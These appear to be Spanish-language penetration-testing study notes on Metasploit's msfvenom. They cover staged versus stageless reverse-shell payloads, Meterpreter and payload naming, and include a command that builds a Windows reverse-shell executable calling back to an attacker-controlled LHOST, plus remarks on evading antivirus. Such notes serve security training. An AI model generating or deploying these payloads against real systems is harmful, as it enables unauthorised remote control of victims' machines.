Msfvenom: La tienda única para todo lo relacionado con payloads.

Parte del framework de Metasploit, msfvenom se usa para generar código para reverse y bind shells. Se usa extensivamente en el desarrollo de exploits a bajo nivel (cercano a lenguaje máquina, no "fácil") para generar código shell hexadecimal al desarrollar un exploit como un buffer overflow. Sin embargo, también puede usarse para generar payloads en varios formatos (`.exe`, `.aspx`, `.py`, `.war`, etc.).

La sintaxis estándar es:

`msfvenom -p <payload> <opciones>`

Por ejemplo, para generar una reverse shell x64 de Windows en formato `.exe`, usamos:

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<ip_escucha> LPORT=<puerto_escucha>`

![[Pasted image 20251125112430.png]]

- `-f`: Especifica el formato.
- `-o`: Especifica el nombre/ruta del proyecto final.
- `LHOST`: Especifica la dirección IP de la máquina del atacante (reverse shell).
- `LPORT`: Especifica el puerto en escucha de la máquina del atacante.

-------------------------------------------
<h2>Staged vs Stageless</h2>
Antes de ir más allá, hay otros dos conceptos que debemos introducir: payloads de reverse shells **staged** y payloads de reverse shell **stageless**.

- **Staged:** Los payloads staged **se mandan en dos partes**. La primera parte se llama stager. Es una pieza de código que se ejecuta directamente en la máquina atacada. Se conecta al listener que espera pero no contiene código de reverse shell, sino que se conecta al listener y usa la conexión para cargar el payload real. De esta manera evita ser cargada en disco, donde podría ser detectada por anti-virus convencionales. Este tipo de payloads suele requerir un listener especial, como `multi/handler` de Metasploit.
- **Stageless:** los payloads stageless **se mandan en una sola parte**. Son más comunes, y los que hemos estado usando hasta el momento. En cuanto lo ejecutamos se manda una shell de vuelta al listener.

Los payloads stageless tienden a ser más fáciles de usar y capturar. Sin embargo, también son más grandes y más fácil para un antivirus detectarlos. Aunque tradicionalmente los payloads staged tenían ventaja frente a los stageless por se menos detectables, los antivirus modernos comprueban la cargada en memoria por lo que estos han perdido valor.

--------------------------------------------
<h2>Meterpreter</h2>
Hablando de Metasploit, hay otra cosa importante de la que hablar, la Meterpreter shell. Estas son las consolas propias, con amplias funcionalidades integradas de Metasploit. Son completamente estables, haciéndolas una muy buena opción para trabajar con objetivos Windows. Si queremos usar alguna de las herramientas post-explotación de Metasploit necesitamos una shell Meterpreter. El único "pero" de estas shells es que necesitan ser capturadas en Metasploit.

-----------------------------------------------
<h2>Convenciones de Nombramiento de Payloads</h2>
Al trabajar con msfvenom, es importante entender cómo funciona el sistema de nombramiento.

La convención básica es:

`<OS>/<arch>/<payload>`

Por ejemplo:

`linux/x86/shell_reverse_tcp`

Esto generaria una reverse shell para un objetivo Linux x86.

La excepción a esta convención es Windows de 32 bits, para los cuales no se especifica la arquitectura:

`windows/shell_reverse_tcp`

Desglosemos ahora un poco la parte del payload. 

En los ejemplos de arriba hemos usado `shell_reverse_tcp`. Esto indica que es un payload **stageless**. Estos se denotan con `_`. Si quisiéramos denotar un payload staged, sería:

`shell/reverse_tcp`

Todos los payloads staged se denotan con `/`.

----------------------------------------------
A parte de la página de manual de `msfconsole`, lo más importante de saber cuando trabajamos con msfvenom es:

`msfvenom --list payloads`

Esto puede usarse para listar todos los payloads disponibles, que pueden ser pipeados a `grep` para buscar un set de payloads específicos.

Por ejemplo:

![[Pasted image 20251125120730.png]]

